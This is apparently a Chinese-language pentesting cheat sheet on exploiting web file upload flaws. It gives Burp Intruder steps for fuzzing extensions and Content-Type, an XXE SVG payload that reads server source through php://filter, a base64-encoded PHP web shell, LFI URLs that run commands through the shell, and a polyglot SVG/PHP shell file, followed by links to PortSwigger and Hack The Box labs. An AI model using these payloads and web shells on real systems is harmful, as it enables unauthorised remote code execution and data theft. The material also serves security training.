# File uploads

## <mark style="color:red;">**1. 發現點**</mark>&#x20;

1. **個人相片上載**
2. **資料上載**&#x20;
3. **任何東西上載**

## <mark style="color:red;">**2. 測試Payload**</mark>

#### **1️⃣ 啟動 Burp Suite & 攔截請求**

1. **開啟 Burp Suite**
2. **確保 Intercept 開啟**：
   * 進入 **Proxy** > **Intercept is on**（確保攔截功能開啟）
3. **嘗試上傳一個合法的 `.jpg` 圖片**
   * 在 Web 應用中選擇一張 **正常的圖片**（`test.jpg`）
   * 點擊 **上傳**，Burp Suite 應該會攔截這個請求

***

#### **2️⃣ 送請求到 Intruder**

1. **在 Burp 中右鍵請求**
   * `右鍵` → `Send to Intruder` (`Ctrl + I`)
2. **切換到 Intruder 標籤**
   * 點擊 **Intruder** > **Target**
   * 確保 **目標 URL** 是正確的（檢查 `Host`）

***

#### **3️⃣ 設定攻擊點 (Positions)**

1. 進入 **Positions** 分頁
2. 點擊 `Clear §` **清除預設標記**
3. **手動標記測試點**：
   *   **文件名擴展名測試點**

       ```
       filename=shell§.jpg§
       ```
4. 觀察回應
5. 確保 `Attack type` 選擇 **Sniper**（單點測試）

***

#### **4️⃣ 設定 Payloads**

#### **📌 測試文件擴展名繞過**

1. **切換到 `Payloads` 分頁**
2. **Payload Set** 選擇 **1**
3. **Payload type** 選擇 **Simple list**
4. **輸入以下可能繞過的擴展名**：
5. **手動標記測試點**：
6.  **文件名擴展名測試點**

    ```
    filename=shell§.jpg§
    ```
7. [PHP extensions.list](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
8. [ASP Extensions ASP 擴充](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)
9. [Web Extensions 網路擴充](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
10. **取消勾選**「對這些字元進行 URL 編碼」（`URL-encode these characters`）

***

#### 5️⃣ **設定 Payloads**

#### **📌 測試 Content-Type 繞過**

1. **選擇 `Payload Set 2`**
2. **Payload type** 選擇 **Simple list**
3. ```sh
   wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt
   ```
4. ```sh
   cat web-all-content-types.txt | grep 'image/' | xclip -se c
   ```
5.  **輸入可能繞過的 `Content-Type`**

    ```
    image/jpeg
    image/pjpeg
    image/gif
    image/png
    text/plain
    application/octet-stream
    application/x-php
    multipart/form-data
    ```
6. **取消勾選**「對這些字元進行 URL 編碼

## <mark style="color:red;">3. 如果文件成功上傳，但無法執行，可以透過 LFI 讀取 Web Shell！</mark>

**使用 XXE 提取上傳文件內容**

1️⃣ **發送 XXE 載荷來讀取上傳文件的內容**：

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
]>
<svg>&xxe;</svg>
```

2️⃣ **回應可能會包含 Base64 編碼的 Web Shell**：

* 使用 `base64 -d` 來解碼：

```bash
becho "PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==" | base64 -d
```

**如果已知 Web Shell 存放路徑，可以利用 LFI 直接執行：**

```
http://target.com/index.php?file=../../uploads/shell.php&cmd=whoami
```

```
http://target.com/index.php?file=php://filter/convert.base64-encode/resource=../../uploads/shell.php
```

upload.php 的資料，然後知道儲存的位置

## <mark style="color:red;">**4.bypass技巧**</mark>

```
cat << 'EOF' > shell.phar.svg    
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
EOF

```

{% file src="../.gitbook/assets/php_to_jpeg (4).py" %}

{% file src="../.gitbook/assets/php_to_pdf (1).py" %}

{% file src="../.gitbook/assets/php_to_png (1).py" %}

{% file src="../.gitbook/assets/php_to_svg (1).py" %}

{% file src="../.gitbook/assets/php_to_zip (1).py" %}

```
http://target.com/index.php?file=../../uploads/shell.php&cmd=whoami
```

```
http://target.com/index.php?file=php://filter/convert.base64-encode/resource=../../uploads/shell.php
```

## <mark style="color:red;">5. 訓練</mark>

⭐

[File upload vulnerabilities](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)

⭐⭐

[透過路徑遍歷上傳 Web shell](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

⭐⭐⭐

[透過多語言 Web Shell 上傳執行遠端程式碼](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

[⭐⭐⭐⭐](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

[透過競爭條件上傳 Web shell](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

⭐⭐⭐⭐⭐

{% embed url="https://www.file.io/" %}

{% embed url="https://academy.hackthebox.com/module/136/section/1310" %}

[https://www.youtube.com/watch?v=V\_CkT7xyiCc\&list=PLidcsTyj9JXItWpbRtTg6aDEj10\_F17x5\&index=3](https://www.youtube.com/watch?v=V_CkT7xyiCc\&list=PLidcsTyj9JXItWpbRtTg6aDEj10_F17x5\&index=3)
